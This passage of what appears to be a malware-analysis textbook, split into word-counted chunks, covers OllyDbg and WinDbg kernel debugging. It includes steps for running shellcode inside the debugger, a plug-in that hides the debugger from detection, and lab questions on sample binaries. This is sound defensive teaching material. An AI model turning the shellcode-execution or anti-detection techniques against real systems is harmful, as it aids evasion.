As you can see in Figure 9-4, the executable is labeled along with its code and 
data sections. All DLLs and their code and data sections are also viewable. 
You can double-click any row in the memory map to show a memory dump of 
that section. Or you can send the data in a memory dump to the disassembler 
window by right-clicking it and selecting View in Disassembler.
[Word Count: 84]

The memory map can help you understand how a PE file is rebased during 
runtime. Rebasing is what happens when a module in Windows is not loaded 
at its preferred base address.
[Word Count: 32]

The relocation process is more involved than simply loading the code at 
another location. Many instructions refer to relative addresses in memory, 
but others refer to absolute ones. For example, Listing 9-1 shows a typical 
series of instructions.
[Word Count: 38]

00401203
mov eax, [ebp+var_8] 
00401206
cmp [ebp+var_4], 0 
0040120a
jnz loc_0040120
0040120c
mov eax, dword_40CF60
[Word Count: 15]

Listing 9-1: Assembly code that requires relocation
[Word Count: 7]

Most of these instructions will work just fine, no matter where they are 
loaded in memory since they use relative addresses. However, the data-access 
instruction at  will not work, because it uses an absolute address to access a 
memory location. If the file is loaded into memory at a location other than 
the preferred base location, then that address will be wrong. This instruction 
must be changed when the file is loaded at a different address. Most DLLs 
will come packaged with a list of these fix-up locations in the .reloc section of 
the PE header.
[Word Count: 97]

Figure 9-5: DLL-B is relocated into a different 
memory address from its requested location
[Word Count: 14]

If you’re looking at DLL-B in IDA Pro while also debugging the applica-
tion, the addresses will not be the same, because IDA Pro has no knowledge 
of rebasing that occurs at runtime. You may need to frequently adjust every 
time you want to examine an address in memory that you got from IDA Pro. 
To avoid this issue, you can use the manual load process we discussed in 
Chapter 5.
[Word Count: 71]

Malware often uses multiple threads. You can view the current threads within 
a program by selecting ViewThreads to bring up the Threads window. This 
window shows the memory locations of the threads and their current status 
(active, paused, or suspended).
Since OllyDbg is single-threaded, you might need to pause all of the 
threads, set a breakpoint, and then continue to run the program in order to 
begin debugging within a particular thread. Clicking the pause button in the 
main toolbar pauses all active threads. Figure 9-6 shows an example of the 
Threads window after all five threads have been paused.
[Word Count: 100]

You can also kill individual threads by right-clicking an individual thread, 
which displays the options shown in Figure 9-6, and selecting Kill Thread.
[Word Count: 23]

Figure 9-6: Threads window showing five paused threads and the 
context menu for an individual thread
[Word Count: 16]

Each thread in a given process has its own stack, and important data is 
often stored on the stack. You can use the memory map to view the stacks in 
memory. For example, in Figure 9-4, you can see that OllyDbg has labeled 
the main thread stack as “stack of main thread.”
[Word Count: 52]

A thorough knowledge and ability to execute code within a debugger is 
important to debugging success, and there are many different ways to exe-
cute code in OllyDbg. Table 9-1 lists the most popular methods.
[Word Count: 35]

The simplest options, Run and Pause, cause a program to start or stop 
running. However, Pause is seldom used, because it can cause a program to 
pause in a location that is not very useful (such as on library code). Rather 
than use Pause, you will typically want to be more selective by setting break-
points, as discussed in the next section.
[Word Count: 62]

Table 9-1: OllyDbg Code-Execution Options
[Word Count: 5]

Run to selection
BreakpointRun to Selection
F4
[Word Count: 7]

Run until return
DebugExecute till Return
CTRL-F9
[Word Count: 7]

Run until user code
DebugExecute till User Code
ALT-F9
[Word Count: 9]

Single-step/step-into
DebugStep Into
F7
[Word Count: 4]

010073a4
call 01007568
010073a9
xor ebx, ebx
[Word Count: 7]

If you step-over the call instruction, OllyDbg will immediately pause exe-
cution at 010073a9 (the xor ebx, ebx instruction after the call). This is useful 
because you may not want to dive into the subroutine located at 01007568.
Although stepping-over is conceptually simple, under the hood, it is 
much more complicated. OllyDbg places a breakpoint at 010073a9, resumes 
execution (as if you had hit the Run button), and then when the subroutine 
eventually executes a ret instruction, it will pause at 010073a9 due to the hid-
den breakpoint.
[Word Count: 88]

WARNING 
In almost all cases, stepping-over will work as expected. But in rare cases, it’s possible 
for obfuscated or malicious code to take advantage of this process. For example, the 
subroutine at 01007568 might never execute a ret, or it could be a so-called get-EIP 
operation that pops the return address off the stack. In rare cases such as these, stepping-
over could cause the program to resume execution without ever pausing, so be aware 
and use it cautiously.
[Word Count: 79]

Software breakpoints are particularly useful when debugging a string decoder 
function. Recall from Chapter 1 that strings can be a useful way to gain 
insight into a program’s functionality, which is why malware authors often 
try to obfuscate strings. When malware authors do this, they often use a string 
decoder, which is called before each string is used. Listing 9-2 shows an 
example with calls to String_Decoder after obfuscated data is pushed on the 
stack.
[Word Count: 75]

push offset "4NNpTNHLKIXoPm7iBhUAjvRKNaUVBlr"
call String_Decoder
...
push offset "ugKLdNlLT6emldCeZi72mUjieuBqdfZ"
call String_Decoder
...
[Word Count: 12]

Listing 9-2: A string decoding breakpoint
[Word Count: 6]

The obfuscated data is often decoded into a useful string on the stack, so 
the only way to see it is to view the stack once the string decoder is complete. 
Therefore, the best place to set a breakpoint to view all of the strings is at the 
end of the string decoder routine. In this way, each time you choose Play in 
OllyDbg, the program will continue executing and will break when a string is
[Word Count: 76]

Function
Right-click menu selection
Hotkey
[Word Count: 5]

Software breakpoint
BreakpointToggle
F2
[Word Count: 4]

Conditional breakpoint
BreakpointConditional
SHIFT-F2
[Word Count: 4]

Hardware breakpoint
BreakpointHardware, on Execution
[Word Count: 5]

Memory breakpoint on access 
(read, write, or execute)
BreakpointMemory, on Access
F2 
(select memory)
[Word Count: 14]

Memory breakpoint on write
BreakpointMemory, on Write
[Word Count: 7]

decoded for use. This method will identify only the strings the program uses 
as it uses them. Later in this chapter, we will discuss how to modify instruc-
tions to decode all of the strings at once.
[Word Count: 37]

As you learned in the previous chapter, conditional breakpoints are software 
breakpoints that will break only if a certain condition is true. OllyDbg allows 
you to set conditional breakpoints using expressions; each time the software 
breakpoint is hit, the expression is evaluated. If the expression result is non-
zero, execution pauses.
[Word Count: 51]

WARNING 
Be careful when using conditional breakpoints. Setting one may cause your program to 
run much more slowly, and if you are incorrect about your condition, the program may 
never stop running.
[Word Count: 32]

Figure 9-7: Stack window at the start of 
VirtualAlloc
[Word Count: 9]

The figure shows the top five items on the stack. The return address 
is first, followed by the four parameters (Address, Size, AllocationType, and 
Protect) for VirtualAlloc. The parameters are labeled next to their values and 
location in the stack. In this example, 0x29 bytes are to be allocated. Since 
the top of the stack is pointed to by the ESP register in order to access the 
Size field, we must reference it in memory as [ESP+8].
[Word Count: 77]

Figure 9-8 shows the disassembler window when a breakpoint is hit at the 
start of VirtualAlloc. We set a conditional breakpoint when [ESP+8]>100, in 
order to catch Poison Ivy when it is about to receive a large amount of shell-
code. To set this conditional software breakpoint, follow these steps:
[Word Count: 50]

1.
Right-click in the disassembler window on the first instruction of the 
function, and select BreakpointConditional. This brings up a dialog 
asking for the conditional expression.
[Word Count: 26]

2.
Set the expression and click OK. In this example, use [ESP+8]>100.
[Word Count: 12]

3.
Click Play and wait for the code to break.
[Word Count: 10]

Figure 9-8: Setting a conditional breakpoint in the 
disassembler window
[Word Count: 10]

OllyDbg supports memory breakpoints, allowing you to set a breakpoint on a 
chunk of memory in order to have the code break on access to that memory. 
OllyDbg supports the use of software and hardware memory breakpoints, as 
well as the ability to specify whether you want it to break on read, write, exe-
cute, or any access.
[Word Count: 58]

1.
Bring up the Memory Map window and right-click the DLL’s .text sec-
tion (the section that contains the program’s executable code).
[Word Count: 22]

2.
Select Set Memory Breakpoint on Access.
[Word Count: 7]

3.
Press F9 or click the play button to resume execution.
[Word Count: 11]

The program should break when execution ends up in the DLL’s .text 
section.
[Word Count: 13]

In addition to being able to load and attach to executables, OllyDbg can also 
debug DLLs. However, since DLLs cannot be executed directly, OllyDbg uses 
a dummy program called loaddll.exe to load them. This technique is extremely 
useful, because malware often comes packaged as a DLL, with most of its 
code contained inside its DllMain function (the initialization function called 
when a DLL is loaded into a process). By default, OllyDbg breaks at the DLL 
entry point (DllMain) once the DLL is loaded.
[Word Count: 83]

Next, OllyDbg will pause, and you can call specific exports with arguments 
and debug them by selecting DebugCall DLL Export from the main menu.
For example, in Figure 9-10, we have loaded ws2_32.dll into OllyDbg and 
called the ntohl function at , which converts a 32-bit number from network 
to host byte order. On the left, we can add any arguments we need. Here, we 
add one argument, which is 127.0.0.1 (0x7F000001) in network byte order at . 
The boxes on the left are checked only where we are supplying arguments.
[Word Count: 91]

In order to call exported functions 
with arguments inside the debugged 
DLL, you first need to load the DLL with 
OllyDbg. Then, once it pauses at the 
DLL entry point, click the play button to 
run DllMain and any other initialization 
the DLL requires, as shown in Figure 9-9.
[Word Count: 49]

Tracing is a powerful debugging technique that records detailed execution 
information for you to examine. OllyDbg supports a variety of tracing fea-
tures, including the standard back trace, call stack trace, and run trace.
[Word Count: 34]

Any time you are moving through the disassembler window with the Step 
Into and Step Over options, OllyDbg is recording that movement. You can 
use the minus () key on your keyboard to move back in time and see the 
instructions you previously executed. The plus () key will take you forward. 
If you used Step Into, you can trace each step taken. If you used Step Over,
[Word Count: 68]

you can step in only the areas that you stepped on before; you can’t go back 
and then decide to step into another area.
[Word Count: 24]

You can use OllyDbg to view the execution path to a given function via a call 
stack trace. To view a call stack, select ViewCall Stack from the main menu. 
You will see a window displaying the sequence of calls taken to reach your 
current location.
To walk the call stack, click the Address or Called From sections of the 
Call Stack window. The registers and stack will not show what was going on 
when you were at that location, unless you are performing a run trace.
[Word Count: 87]

A run trace allows you to execute code and have OllyDbg save every executed 
instruction and all changes made to the registers and flags.
There are several ways to activate run tracing:
[Word Count: 32]


Highlight the code you wish to trace in the disassembler window, right-
click it, and select Run TraceAdd Selection. After execution of that 
code, select ViewRun Trace to see the instructions that were exe-
cuted. Use the  and + keys on your keyboard to navigate the code 
(as discussed in “Standard Back Trace” on page 192). With this method, 
you’ll see the changes that occurred to every register for each instruction 
as you navigate.
[Word Count: 76]


Use the Trace Into and Trace Over options. These options may be easier 
to use than Add Selection, because you don’t need to select the code you 
wish to trace. Trace Into will step into and record all instructions that 
execute until a breakpoint is hit. Trace Over will record only the instruc-
tions that occur in the current function you are executing.
[Word Count: 64]

WARNING 
If you use the Trace Into and Trace Over options without setting a breakpoint, OllyDbg 
will attempt to trace the entire program, which could take a long time and consume a 
lot of memory.
[Word Count: 35]


Select DebugSet Condition. You can trace until a condition hits, caus-
ing the program to pause. This is useful when you want to stop tracing 
when a condition occurs, and back trace from that location to see how or 
why it occurred. You’ll see an example of this usage in the next section.
[Word Count: 54]

Recall from our earlier discussion that the Poison Ivy backdoor often allo-
cates memory for shellcode that it receives from its command-and-control 
server. Poison Ivy downloads the shellcode, copies it to the dynamically allo-
cated location, and executes it. In some cases, you can use tracing to catch 
that shellcode execution when EIP is in the heap. The trace can show you 
how the shellcode started.
[Word Count: 66]

By default, when an exception occurs while OllyDbg is attached, the program 
stops executing and the debugger is given control first. The debugger can 
handle the exception or pass it to the program. OllyDbg will pause execution 
when the exception happens, and you can decide to pass the exception to 
the program with one of the following:
[Word Count: 57]


SHIFT-F7 will step into the exception.
[Word Count: 7]


SHIFT-F9 will run the exception handler.
[Word Count: 7]

OllyDbg has options for handling exceptions, as shown in Figure 9-12. 
These options can tell the debugger to ignore certain exceptions and pass 
them directly to the program. (It is often a good idea to ignore all exceptions 
during malware analysis, because you are not debugging the program in 
order to fix problems.)
[Word Count: 53]

Figure 9-12: Exception handling options in OllyDbg
[Word Count: 7]

Figure 9-13: Patching options in OllyDbg
[Word Count: 6]

Note that the patch is in live memory only for this instance of the pro-
cess. We can take the patching a step further by copying the change out to an 
executable. This is a two-step process, as outlined in Figure 9-14.
[Word Count: 42]

Figure 9-14: Two-step process for copying a live memory patch to an executable on disk
[Word Count: 15]

OllyDbg has an easy (if undocumented) way to analyze shellcode. Follow 
these steps to use this approach:
[Word Count: 17]

1.
Copy shellcode from a hex editor to the clipboard.
[Word Count: 10]

2.
Within the memory map, select a memory region whose type is Priv. 
(This is private memory assigned to the process, as opposed to the read-
only executable images that are shared among multiple processes.)
[Word Count: 35]

3.
Double-click rows in the memory map to bring up a hex dump so you 
can examine the contents. This region should contain a few hundred 
bytes of contiguous zero bytes.
[Word Count: 31]

4.
Right-click the chosen region in the Memory Map window, and select 
Set AccessFull Access to give the region read, write, and execute 
permissions.
[Word Count: 24]

5.
Return to the memory dump window. Highlight a region of zero-filled 
bytes large enough for the entire shellcode to fit, right-click the selec-
tion, and select BinaryBinary Paste. This will paste the shellcode to the 
selected region.
[Word Count: 38]

6.
Set the EIP register to the location of the memory you modified. (You 
can easily set the EIP register by right-clicking an instruction in the dis-
assembler window and selecting New Origin Here.)
[Word Count: 34]

Now you can run, debug, and single-step through the shellcode, just as 
you would a normal program.
[Word Count: 17]

OllyDbg provides many mechanisms to help with analysis, including the 
following:
[Word Count: 11]

Logging
OllyDbg keeps a log of events constantly available. To access 
them, select ViewLog. This log shows which executable modules were 
loaded, which breakpoints were hit, and other information. The log can 
be useful during your analysis to figure out which steps you took to get to 
a certain state.
[Word Count: 50]

Watches window
OllyDbg supports the use of a Watches window, which 
allows you to watch the value of an expression that you generate. This 
expression is constantly updated in this window, which can be accessed 
by selecting ViewWatches. You can set an expression in the Watches 
window by pressing the spacebar.
[Word Count: 51]

Help
The OllyDbg HelpContents option provides a detailed set of 
instructions for writing expressions under Evaluation of Expressions. 
This is useful if you need to monitor a specific piece of data or compli-
cated function. For example, if you wanted to monitor the memory loca-
tion of EAX+ESP+4, you would enter the expression [EAX+ESP+4].
[Word Count: 54]

Labeling
As with IDA Pro, you can label subroutines and loops in 
OllyDbg. A label in OllyDbg is simply a symbolic name that is assigned to 
an address of the debugged program. To set a label in the disassembler 
window, right-click an address and select Label. This will pop up a win-
dow, prompting you for a label name. All references to this location will 
now use this label instead of the address. Figure 9-15 shows an example 
of adding the label password_loop. Notice how the name reference at 
0x401141 changes to reflect the new name.
[Word Count: 96]

OllyDbg has standard plug-ins and many additional ones available for down-
load. You’ll find a decent collection of OllyDbg plug-ins that are useful for 
malware analysis at http://www.openrce.org/downloads/browse/OllyDbg_Plugins.
OllyDbg plug-ins come as DLLs that you place in the root OllyDbg install 
directory. Once in that directory, the plug-ins should be recognized automat-
ically and added to the Plugins menu.
[Word Count: 59]

NOTE
Writing plug-ins in OllyDbg can be a tedious process. If you wish to extend the func-
tionality of OllyDbg, we recommend writing Python scripts, as described later in the 
chapter, in “Scriptable Debugging” on page 200.
[Word Count: 37]

The Hide Debugger plug-in employs a number of methods to hide OllyDbg 
from debugger detection. Many malware analysts run this plug-in all the 
time, just in case the malware employs anti-debugging.
This plug-in specifically protects against IsDebuggerPresent checks, 
FindWindow checks, unhandled exception tricks, and the OuputDebugString 
exploit against OllyDbg. (We discuss anti-debugging techniques in 
Chapter 16.)
[Word Count: 56]

The Command Line plug-in allows you to have command-line access to 
OllyDbg. The command line can create a WinDbg-like experience, although 
not many users of OllyDbg take advantage of it. (The WinDbg debugger is 
discussed in the next chapter.)
[Word Count: 39]

To activate the command-line window, select PluginsCommand Line
Command Line. Table 9-3 shows the list of common commands. Additional 
commands can be found in the help file that comes with the Command Line 
plug-in.
[Word Count: 34]

Figure 9-17: Using the command line to quickly set breakpoints
[Word Count: 10]

The Bookmarks plug-in is included by default in OllyDbg. It enables you to 
add bookmarks of memory locations, so that you can get to them easily in the 
future without needing to remember the addresses.
[Word Count: 35]

Table 9-3: Commands for the OllyDbg Command Line
[Word Count: 8]

BP expression [,condition]
Set software breakpoint
[Word Count: 6]

HW expression
Set hardware breakpoint on execution
[Word Count: 7]

BPX label
Set breakpoint on each call to label
[Word Count: 9]

To add a bookmark, right-click in the disassembler window and 
select BookmarkInsert Bookmark. To view bookmarks, select Plugins
BookmarksBookmarks, and then click any of your bookmarks to go to 
that location.
[Word Count: 31]


A number of import statements can be used to import Python modules 
(as in any Python script). The functionality of ImmDbg itself is accessed 
through the immlib or immutils module.
[Word Count: 31]


A main function reads the command-line arguments (passed in as a 
Python list).
[Word Count: 14]


Code implements the actions of the PyCommand.
[Word Count: 8]


A return contains a string. Once the script finishes execution, the main 
debugger status bar will be updated with this string.
[Word Count: 22]

The code in Listing 9-3 shows a simple script implemented as a 
PyCommand. This script can be used to prevent malware from deleting 
a file from the system.
[Word Count: 28]

def Patch_DeleteFileA(imm): 
    delfileAddress = imm.getAddress("kernel32.DeleteFileA")
    if (delfileAddress <= 0):
        imm.log("No DeleteFile to patch")
        return
[Word Count: 15]

imm.log("Patching DeleteFileA")
    patch = imm.assemble("XOR EAX, EAX \n Ret 4") 
    imm.writeMemory(delfileAddress, patch)
[Word Count: 13]

def main(args): 
    imm = immlib.Debugger()
    Patch_DeleteFileA(imm)
    return "DeleteFileA is patched..."
[Word Count: 11]

Listing 9-3: PyCommand script to neuter DeleteFile
[Word Count: 7]

Analyze the malware found in the file Lab09-01.exe using OllyDbg and IDA 
Pro to answer the following questions. This malware was initially analyzed in 
the Chapter 3 labs using basic static and dynamic analysis techniques.
[Word Count: 35]

1.
How can you get this malware to install itself?
[Word Count: 10]

2.
What are the command-line options for this program? What is the pass-
word requirement?
[Word Count: 15]

3.
How can you use OllyDbg to permanently patch this malware, so that it 
doesn’t require the special command-line password?
[Word Count: 20]

4.
What are the host-based indicators of this malware?
[Word Count: 9]

5.
What are the different actions this malware can be instructed to take via 
the network?
[Word Count: 16]

6.
Are there any useful network-based signatures for this malware?
[Word Count: 10]

Analyze the malware found in the file Lab09-02.exe using OllyDbg to answer 
the following questions.
[Word Count: 15]

1.
What strings do you see statically in the binary?
[Word Count: 10]

2.
What happens when you run this binary?
[Word Count: 8]

3.
How can you get this sample to run its malicious payload?
[Word Count: 12]

5.
What arguments are being passed to subroutine 0x00401089?
[Word Count: 9]

6.
What domain name does this malware use?
[Word Count: 8]

7.
What encoding routine is being used to obfuscate the domain name?
[Word Count: 12]

8.
What is the significance of the CreateProcessA call at 0x0040106E?
[Word Count: 11]

Analyze the malware found in the file Lab09-03.exe using OllyDbg and IDA Pro. 
This malware loads three included DLLs (DLL1.dll, DLL2.dll, and DLL3.dll) 
that are all built to request the same memory load location. Therefore, when 
viewing these DLLs in OllyDbg versus IDA Pro, code may appear at different 
memory locations. The purpose of this lab is to make you comfortable with 
finding the correct location of code within IDA Pro when you are looking at 
code in OllyDbg.
[Word Count: 79]

1.
What DLLs are imported by Lab09-03.exe?
[Word Count: 7]

2.
What is the base address requested by DLL1.dll, DLL2.dll, and DLL3.dll?
[Word Count: 12]

3.
When you use OllyDbg to debug Lab09-03.exe, what is the assigned based 
address for: DLL1.dll, DLL2.dll, and DLL3.dll?
[Word Count: 19]

4.
When Lab09-03.exe calls an import function from DLL1.dll, what does 
this import function do?
[Word Count: 15]

5.
When Lab09-03.exe calls WriteFile, what is the filename it writes to?
[Word Count: 12]

6.
When Lab09-03.exe creates a job using NetScheduleJobAdd, where does it get 
the data for the second parameter?
[Word Count: 18]

7.
While running or debugging the program, you will see that it prints out 
three pieces of mystery data. What are the following: DLL 1 mystery 
data 1, DLL 2 mystery data 2, and DLL 3 mystery data 3?
[Word Count: 39]

8.
How can you load DLL2.dll into IDA Pro so that it matches the load 
address used by OllyDbg?
[Word Count: 19]

K E R N E L  D E B U G G I N G  W I T H  
W I N D B G
[Word Count: 25]

WinDbg (often pronounced “Windbag”) is a free 
debugger from Microsoft. While not as popular as 
OllyDbg for malware analysis, WinDbg has many 
advantages, the most significant of which is kernel 
debugging. This chapter explores ways to use WinDbg 
for kernel debugging and rootkit analysis.
[Word Count: 44]

WinDbg does support user-mode debugging, and much of the informa-
tion in this chapter is applicable to user mode and kernel mode, but we will 
focus on kernel mode because most malware analysts use OllyDbg for user-
mode debugging. WinDbg also has useful features for monitoring interac-
tions with Windows, as well as extensive help files.
[Word Count: 56]

reaches a kernel-mode driver. Requests originate from a user-mode program 
and eventually reach the kernel. Some requests are sent to drivers that con-
trol hardware; others affect only the internal kernel state.
[Word Count: 32]

Figure 10-1: How user-mode calls are handled by the kernel
[Word Count: 10]

NOTE
Some kernel-mode malware has no significant user-mode component. It creates no 
device object, and the kernel-mode driver executes on its own.
[Word Count: 22]

Malicious drivers generally do not usually control hardware; instead, 
they interact with the main Windows kernel components, ntoskrnl.exe and 
hal.dll. The ntoskrnl.exe component has the code for the core OS functions, 
and hal.dll has the code for interacting with the main hardware components. 
Malware will often import functions from one or both of these files in order 
to manipulate the kernel.
[Word Count: 61]

Listing 10-1 shows a Windows boot.ini with a line added to enable kernel 
debugging.
[Word Count: 14]

[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
[operating systems]
 multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional"
/noexecute=optin /fastdetect
 multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional with Kernel
[Word Count: 20]

Debugging" /noexecute=optin /fastdetect /debug /debugport=COM1 /baudrate=115200
[Word Count: 6]

Listing 10-1: Sample boot.ini file modified to enable kernel debugging
[Word Count: 10]

NOTE
Simply because you start the OS with the debugger enabled does not mean that you are 
required to attach a debugger. The OS should run fine without a debugger attached.
[Word Count: 31]

Next, we configure VMware to create a virtual connection between the 
virtual machine and the host OS. To do so, we’ll use a serial port on a named 
pipe on the host by adding a new device. Follow these steps to add a new 
device:
[Word Count: 45]

1.
Click VMSettings to open the VMWare Settings dialog.
[Word Count: 9]

2.
In the Settings dialog, click the Add button on the lower right, and 
then select Serial Port in the window containing the types of devices.
[Word Count: 26]

3.
In the dialog requesting the type of serial port, select Output to 
Named Pipe.
[Word Count: 15]

4.
At the next window, enter \\.\pipe\com_1 for the name of the socket and 
select This end is the server and The other end is an application. Once 
you’ve finished adding the serial port, the virtual machine settings 
should show a serial port device configured as shown in Figure 10-2.
[Word Count: 50]

5.
Check the box labeled Yield CPU on poll.
[Word Count: 9]

NOTE
The exact sequence of windows and dialog boxes differs between versions of VMware. 
The instructions here are specific to VMware Workstation 7. The settings should be the 
same for other versions, but the windows and dialogs to configure the settings will differ 
slightly.
[Word Count: 44]

Figure 10-2: Adding a serial port to a virtual machine
[Word Count: 10]

After you’ve configured the virtual machine, start it. Use the following 
steps on the host machine to use WinDbg to connect to the virtual machine 
and start debugging the kernel.
[Word Count: 30]

2.
Select FileKernel Debug, click the COM tab, and enter the filename 
and baud rate that you set before in the boot.ini file—115200 in our case. 
Make sure the Pipe checkbox is checked before selecting OK. Your win-
dow should look like Figure 10-3.
[Word Count: 44]

Figure 10-3: Starting a kernel debugging session 
with WinDbg
[Word Count: 9]

If the virtual machine is running, the debugger should connect within a 
few seconds. If it is not running, the debugger will wait until the OS boots, 
and then connect during the boot process. Once the debugger connects, 
consider enabling verbose output while kernel debugging, so that you’ll get a 
more complete picture of what is happening. With verbose output, you will 
be notified each time a driver is loaded or unloaded. This can help you iden-
tify a malicious driver in some cases.
[Word Count: 84]

WinDbg uses a command-line interface for most of its functionality. We will 
cover the more important commands here. You can browse the complete list 
of commands in the WinDbg Help menu.
[Word Count: 31]

WinDbg’s memory window supports memory browsing directly from the 
command line. The d command is used to read locations in memory such 
as program data or the stack, with the following basic syntax:
[Word Count: 33]

where x is one of several options for how the data will be displayed. 
Table 10-1 shows the most common ways that data can be displayed.
[Word Count: 26]

da
Reads from memory and displays it as ASCII text
[Word Count: 10]

du
Reads from memory and displays it as Unicode text
[Word Count: 10]

dd
Reads from memory and displays it as 32-bit double words
[Word Count: 11]

For example, to display a string at offset 0x401020, you would use the 
command da 0x401020.
The e command is used in the same way to change memory values. It 
uses the following syntax:
[Word Count: 34]

The x values are the same values used by the dx commands. You’ll find 
many additional options documented in the help files.
[Word Count: 22]

You can perform operations on memory and registers directly from the com-
mand line using simple arithmetic operations, such as addition (+), subtrac-
tion (-), multiplication (*), and division (/). Command-line options are 
useful as shortcuts and when trying to create expressions for conditional 
breakpoints.
The dwo command is used to dereference a 32-bit pointer and see the 
value at that location. For example, if you are at a breakpoint for a function 
and the first argument is a wide character string, you can view the string with 
this command:
[Word Count: 90]

The esp+4 is the location of the argument. The dwo operator identifies the 
location of the pointer for the string, and du tells WinDbg to display the wide 
character string at that location.
[Word Count: 33]

The bp command is used to set basic breakpoints in WinDbg. You can also 
specify commands to be run automatically when a breakpoint is hit prior to 
control being passed to the user. This is used with the go (g) command, so 
that the breakpoint performs an action and then continues without waiting 
for the user. For example, the following command will print out the second 
argument every time the GetProcAddress function is called without actually 
stopping the program’s execution.
[Word Count: 80]

The example will print the function name being requested for every call 
to GetProcAddress. This is a useful feature because the breakpoint will be exe-
cuted much faster than if it returned control to the user and waited for the 
user to issue the command. The command string can become fairly sophisti-
cated with support for conditional statements, such as .if statements and 
.while loops. WinDbg supports scripts that use these commands.
[Word Count: 72]

NOTE
Commands sometimes attempt to access invalid memory locations. For example, the sec-
ond argument to GetProcAddress can be either a string or an ordinal number. If the 
argument is an ordinal number, WinDbg will try to dereference an invalid memory 
location. Luckily, it won’t crash and will simply print ???? as the value at that 
address.
[Word Count: 57]

WinDbg does not have a feature similar to OllyDbg’s memory map that lays 
out all the memory segments and loaded modules. Alternatively, WinDbg’s 
lm command will list all the modules loaded into a process, including the exe-
cutables and DLLs in user space and the kernel drivers in kernel mode. The 
starting address and ending address for each module are listed as well.
[Word Count: 63]

The format for referring to a symbol in WinDbg is as follows:
[Word Count: 12]

0:003> x nt!*CreateProcess*
805c736a nt!NtCreateProcessEx = <no type information>
805c7420 nt!NtCreateProcess = <no type information>
805c6a8c nt!PspCreateProcess = <no type information>
804fe144 nt!ZwCreateProcess = <no type information>
804fe158 nt!ZwCreateProcessEx = <no type information>
8055a300 nt!PspCreateProcessNotifyRoutineCount = <no type information>
805c5e0a nt!PsSetCreateProcessNotifyRoutine = <no type information>
8050f1a2 nt!MmCreateProcessAddressSpace = <no type information>
8055a2e0 nt!PspCreateProcessNotifyRoutine = <no type information>
[Word Count: 57]

Another useful command is the ln command, which will list the closest 
symbol for a given memory address. This can be used to determine to which 
function a pointer is directed. For example, let’s say we see a call function to 
address 0x805717aa and we want to know the purpose of the code at that 
address. We could issue the following command:
[Word Count: 62]

0:002> ln 805717aa
kd> ln ntreadfile
 (805717aa)   nt!NtReadFile   |  (80571d38)   nt!NtReadFileScatter
Exact matches:
 
nt!NtReadFile = <no type information>
[Word Count: 20]

The first line  shows the two closest matches, and the last line  shows 
the exact match. Only the first line is displayed if there is no exact match.
[Word Count: 30]

The Microsoft symbols also include type information for many structures, 
including internal types that are not documented elsewhere. This is useful 
for a malware analyst, since malware often manipulates undocumented struc-
tures. Listing 10-2 shows the first few lines of a driver object structure, which 
stores information about a kernel driver.
[Word Count: 51]

0:000> dt nt!_DRIVER_OBJECT
kd> dt nt!_DRIVER_OBJECT
   +0x000 Type             : Int2B
   +0x002 Size             : Int2B
[Word Count: 14]

+0x004 DeviceObject     : Ptr32 _DEVICE_OBJECT
   +0x008 Flags            : Uint4B
 
+0x00c DriverStart      : Ptr32 Void
   +0x010 DriverSize       : Uint4B
   +0x014 DriverSection    : Ptr32 Void
   +0x018 DriverExtension  : Ptr32 _DRIVER_EXTENSION
   +0x01c DriverName       : _UNICODE_STRING
   +0x024 HardwareDatabase : Ptr32 _UNICODE_STRING
   +0x028 FastIoDispatch   : Ptr32 _FAST_IO_DISPATCH
   +0x02c DriverInit       : Ptr32     long 
   +0x030 DriverStartIo    : Ptr32     void 
   +0x034 DriverUnload     : Ptr32     void 
   +0x038 MajorFunction    : [28] Ptr32     long
[Word Count: 64]

Listing 10-2: Viewing type information for a structure
[Word Count: 8]

The structure names hint at what data is stored within the structure. For 
example, at offset 0x00c  there is a pointer that reveals where the driver is 
loaded in memory.
WinDbg allows you to overlay data onto the structure. Let’s say that we 
know there is a driver object at offset 828b2648, and we want to show the 
structure along with each of the values from a particular driver. Listing 10-3 
shows how to accomplish this.
[Word Count: 77]

kd> dt nt!_DRIVER_OBJECT 828b2648 
   +0x000 Type             :
4
   +0x002 Size             :
168
   +0x004 DeviceObject     :
0x828b0a30 _DEVICE_OBJECT
   +0x008 Flags            :
0x12
   +0x00c DriverStart      :
0xf7adb000 
   +0x010 DriverSize       :
0x1080
   +0x014 DriverSection    :
0x82ad8d78 
   +0x018 DriverExtension  :
0x828b26f0 _DRIVER_EXTENSION
   +0x01c DriverName       :
_UNICODE_STRING "\Driver\Beep"
   +0x024 HardwareDatabase :
0x80670ae0 _UNICODE_STRING "\REGISTRY\MACHINE\
HARDWARE\DESCRIPTION\SYSTEM"
   +0x028 FastIoDispatch   :
(null) 
   +0x02c DriverInit       :0xf7adb66c
long  Beep!DriverEntry+0
   +0x030 DriverStartIo    :
0xf7adb51a     void  Beep!BeepStartIo+0
   +0x034 DriverUnload     :
0xf7adb620     void  Beep!BeepUnload+0
   +0x038 MajorFunction    :
[28] 0xf7adb46a     long  Beep!BeepOpen+0
[Word Count: 78]

Listing 10-3: Overlaying data onto a structure
[Word Count: 7]

This is the beep driver, which is built into Windows to make a beeping 
noise when something is wrong. We can see that the initialization function 
that is called when the driver is loaded is located at offset 0xf7adb66c . If this 
were a malicious driver, we would want to see what code was located at that 
address because that code is always called first when the driver is loaded. The 
initialization function is the only function called every time a driver is loaded. 
Malware will sometimes place its entire malicious payload in this function.
[Word Count: 95]

Symbols are specific to the version of the files being analyzed, and can change 
with every update or hotfix. When configured properly, WinDbg will query 
Microsoft’s server and automatically get the correct symbols for the files that 
are currently being debugged. You can set the symbol file path by selecting 
FileSymbol File Path. To configure WinDbg to use the online symbol 
server, enter the following path:
[Word Count: 66]

SRV*c:\websymbols*http://msdl.microsoft.com/download/symbols
[Word Count: 1]

The SRV configures a server, the path c:\websymbols is a local cache for sym-
bol information, and the URL is the fixed location of the Microsoft symbol 
server.
If you’re debugging on a machine that is not continuously connected to 
the Internet, you can manually download the symbols from Microsoft. Down-
load the symbols specific to the OS, service pack, and architecture that you 
are using. The symbol files are usually a couple hundred megabytes because 
they contain the symbol information for all the different hotfix and patch 
versions for that OS and service pack.
[Word Count: 95]

In our example, a user-space component creates a driver that will read and 
write the files in the kernel. First we look at our user-space code in IDA Pro 
to investigate what functions it calls to interact with a driver as shown in 
Listing 10-4.
[Word Count: 45]

04001B3D  push    esi             ; lpPassword
